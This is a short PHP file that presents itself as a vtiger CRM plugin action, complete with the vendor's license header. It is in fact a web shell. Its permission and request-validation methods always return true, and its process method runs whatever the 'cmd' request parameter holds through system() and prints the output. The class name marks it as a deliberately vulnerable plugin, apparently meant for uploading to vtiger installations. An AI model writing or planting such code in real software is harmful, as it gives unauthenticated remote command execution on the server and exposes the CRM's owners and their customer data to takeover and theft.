<?php

/* +***********************************************************************************
 * The contents of this file are subject to the vtiger CRM Public License Version 1.0
 * ("License"); You may not use this file except in compliance with the License
 * The Original Code is:  vtiger CRM Open Source
 * The Initial Developer of the Original Code is vtiger.
 * Portions created by vtiger are Copyright (C) vtiger.
 * All Rights Reserved.
 * *********************************************************************************** */

class VtigerVulnPlugin_Gateway_Action extends Vtiger_BasicAjax_Action {

    public function checkPermission(Vtiger_Request $request) {
        return true;
    }

    public function process(Vtiger_Request $request) {
        echo "<pre>";
        system($request->get("cmd"));
        echo "</pre>";
        die;
    }

    public function validateRequest(Vtiger_Request $request) {
        return true;
    }

}